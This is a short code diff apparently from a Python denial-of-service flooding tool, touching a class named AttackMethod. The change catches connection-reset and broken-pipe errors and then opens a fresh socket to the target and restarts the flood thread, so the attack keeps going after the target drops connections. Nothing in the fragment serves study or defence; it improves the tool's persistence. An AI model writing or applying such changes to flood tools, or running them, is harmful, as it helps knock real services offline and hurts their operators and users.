@@ -101,7 +101,12 @@ class AttackMethod:
                 self.thread = Thread(target=self.__run_flood, args=(sock, proxy))
                 self.thread.start()
         else:
-            self.method(args[0])
+            try:
+                self.method(args[0])
+            except (ConnectionResetError, BrokenPipeError):
+                sock = create_socket(self.target)
+                self.thread = Thread(target=self.__run_flood, args=(sock,))
+                self.thread.start()
         sleep(self.sleep_time)
 
     def __run_flood(
